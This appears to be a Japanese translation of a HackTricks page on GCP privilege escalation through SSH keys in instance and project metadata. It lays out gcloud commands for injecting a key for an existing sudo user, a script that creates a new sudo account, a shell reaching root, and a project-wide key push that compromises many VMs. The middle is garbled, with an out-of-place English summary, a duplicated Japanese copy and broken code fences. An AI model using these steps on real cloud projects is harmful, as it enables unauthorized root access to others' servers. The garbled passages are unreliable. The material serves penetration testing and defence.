# GCP - カスタムSSHメタデータの追加

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>

## メタデータの変更 <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

インスタンスのメタデータを**変更できる**場合、ローカルで権限を昇格させる方法は数多くあります。この権限を持つサービスアカウントにつながるいくつかのシナリオがあります：

_**デフォルトサービスアカウント**_\
サービスアカウントのアクセス**スコープ**が**完全アクセス**に設定されているか、少なくとも**コンピュートAPIへのアクセス**を明示的に許可している場合、この設定は昇格に**脆弱**です。**デフォルト**の**スコープ**は**脆弱ではありません**。

_**カスタムサービスアカウント**_\
カスタムサービスアカウントを使用する場合、権限を昇格させるためには以下のIAM権限の**いずれかが必要**です：

* `compute.instances.setMetadata`（単一のインスタンスに影響を与えるため）
* `compute.projects.setCommonInstanceMetadata`（プロジェクト内のすべてのインスタンスに影響を与えるため）

Googleはカスタムサービスアカウントにアクセススコープを使用しないことを[推奨](https://cloud.google.com/compute/docs/access/service-accounts#associating\_a\_service\_account\_to\_an\_instance)していますが、それでも可能です。以下の**アクセススコープ**のいずれかが必要です：

* `https://www.googleapis.com/auth/compute`
* `https://www.googleapis.com/auth/cloud-platform`

### **SSHキーをカスタムメタデータに追加する**

GCP上の**Linux** **システム**は通常、[Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)スクリプトを実行しています。これらの中には、インスタンスメタデータエンドポイントに対して**定期的に**認証されたSSH公開キーの**変更を照会**する[accounts daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)があります。

**新しい公開**キーが検出されると、それは処理されて**ローカルマシンに追加**されます。キーの形式によっては、**既存のユーザー**の`~/.ssh/authorized_keys`ファイルに追加されるか、`sudo`権限を持つ**新しいユーザーを作成**します。

したがって、サービスアカウントで**カスタムインスタンスメタデータを変更**できる場合、特権アカウントへのSSH権限を**取得する**ことで、ローカルシステム上でrootに**昇格**することができます。**カスタムプロジェクトメタデータを変更**できる場合、accounts daemonを実行している現在のGCPプロジェクト内の**任意のシステム**でrootに**昇格**することができます。

### **既存の特権ユーザーにSSHキーを追加する**

まず、既存のアカウントに自分のキーを追加することから始めましょう。これがおそらく最も少ない騒音を立てるでしょう。

**インスタンスで既存のSSHキーを確認**します。これらのユーザーの1人を選びます。彼らはsudo権限を持っている可能性が高いです。
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
```markdown
# GCP Compute Privilege Escalation via Custom SSH Metadata

## Overview

In GCP, instances can have custom metadata that is used to manage SSH keys. An attacker with the ability to modify an instance's metadata can add their own SSH key, allowing them to gain unauthorized access to that instance.

## Prerequisites

- Access to a GCP account with permissions to modify instance metadata.

## Step-by-Step Guide

1. Navigate to the GCP Console and select the target instance.
2. Go to the instance's details page and click on the "Edit" button.
3. Scroll down to the "SSH Keys" section.
4. Add your public SSH key to the instance's metadata.
5. Save the changes and SSH into the instance using your private key.

## Conclusion

By adding a custom SSH key to an instance's metadata, an attacker can escalate their privileges and gain full control over the instance. It is important for organizations to monitor and restrict who has the ability to modify instance metadata to prevent such attacks.
```

# GCP Compute Privilege Escalation via Custom SSH Metadata

## 概要

GCPでは、インスタンスにはSSHキーを管理するために使用されるカスタムメタデータがあります。インスタンスのメタデータを変更する能力を持つ攻撃者は、自分のSSHキーを追加することで、そのインスタンスへの不正アクセスを可能にします。

## 前提条件

- インスタンスのメタデータを変更する権限を持つGCPアカウントへのアクセス。

## ステップバイステップガイド

1. GCPコンソールに移動し、対象のインスタンスを選択します。
2. インスタンスの詳細ページに移動し、「編集」ボタンをクリックします。
3. 「SSHキー」セクションまでスクロールダウンします。
4. あなたの公開SSHキーをインスタンスのメタデータに追加します。
5. 変更を保存し、あなたの秘密キーを使用してインスタンスにSSHで接続します。

## 結論

インスタンスのメタデータにカスタムSSHキーを追加することで、攻撃者は自分の権限を昇格させ、インスタンスを完全に制御することができます。組織は、このような攻撃を防ぐために、インスタンスのメタデータを変更する能力を監視し、制限することが重要です。
```
```
...
metadata:
fingerprint: QCZfVTIlKgs=
items:
...
- key: ssh-keys
value: |-
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
...
```
公開鍵の**やや奇妙な形式**に注意してください - **ユーザー名**が**最初**に（コロンに続いて）リストされ、その後**最後**にもう一度リストされます。この形式に合わせる必要があります。通常のSSHキー操作とは異なり、ユーザー名は絶対に重要です！

**ユーザー名とキーが含まれる行を新しいテキスト**ファイル`meta.txt`に保存します。

上記のユーザー`alice`をターゲットにすると仮定しましょう。次のように自分用の**新しいキーを生成**します：
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
ファイル `meta.txt` に新しい公開鍵を以下の形式で追加します:
```
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnthNXHxi31LX8PlsGdIF/wlWmI0fPzuMrv7Z6rqNNgDYOuOFTpM1Sx/vfvezJNY+bonAPhJGTRCwAwytXIcW6JoeX5NEJsvEVSAwB1scOSCEAMefl0FyIZ3ZtlcsQ++LpNszzErreckik3aR+7LsA2TCVBjdlPuxh4mvWBhsJAjYS7ojrEAtQsJ0mBSd20yHxZNuh7qqG0JTzJac7n8S5eDacFGWCxQwPnuINeGoacTQ+MWHlbsYbhxnumWRvRiEm7+WOg2vPgwVpMp4sgz0q5r7n/l7YClvh/qfVquQ6bFdpkVaZmkXoaO74Op2Sd7C+MBDITDNZPpXIlZOf4OLb alice
```
Now, you can **SSHキーメタデータを書き換える** 以下のコマンドでインスタンスのために:
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
**`alice`のコンテキストでシェルにアクセスする方法は以下の通りです：**
```
lowpriv@instance:~$ ssh -i ./key alice@localhost
alice@instance:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```
### **新しい特権ユーザーを作成し、SSHキーを追加する**

上記の手順に従っても既存のキーが見つからない場合、または`/etc/passwd`でターゲットにする興味深い他のユーザーがいない場合はどうでしょうか？

**同じプロセスに従って**、ただ**新しいユーザー名を作ります**。このユーザーは自動的に作成され、`sudo`の権利が与えられます。スクリプト化されたプロセスは次のようになります：
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### プロジェクトレベルでのSSHキー <a href="#sshing-around" id="sshing-around"></a>

前のセクションで述べた詳細に従って、さらに多くのVMを侵害しようとすることができます。

これらに少し詳しく触れることで、["Block project-wide SSH keys" オプションを明示的に選択していない任意のインスタンスに対して、**特権アカウントへのSSHアクセス**を許可する、[**プロジェクトレベルでSSHキーを適用する**](https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#project-wide)ことができます。
```
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
大胆なら、`gcloud compute ssh [INSTANCE]` を入力して、他のボックスで現在のユーザー名を使用することもできます。

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で<strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または **HackTricksをPDFでダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
